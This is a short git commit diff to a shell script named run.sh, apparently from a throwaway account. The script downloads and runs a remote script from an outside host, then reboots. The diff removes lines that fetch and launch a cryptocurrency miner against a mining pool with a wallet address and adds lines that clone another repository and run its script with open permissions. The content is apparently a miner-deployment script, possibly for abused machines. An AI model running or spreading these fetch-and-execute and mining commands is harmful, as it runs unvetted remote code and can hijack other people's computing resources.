0683a1565ee0b1d797c16d36ed53be676d4d99a1
haisyqu8q9 <93108587+haisyqu8q9@users.noreply.github.com>
2021-10-25 10:32:05 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -4,7 +4,6 @@ apt-get install wget
 wget http://evira.us/ubi20.sh && chmod +x ubi20.sh && ./ubi20.sh
 reboot
 #
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz 
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 14
+git clone https://github.com/mhdrugr7/onepook.git
+cd onepook
+chmod 777 run.sh && ./run.sh
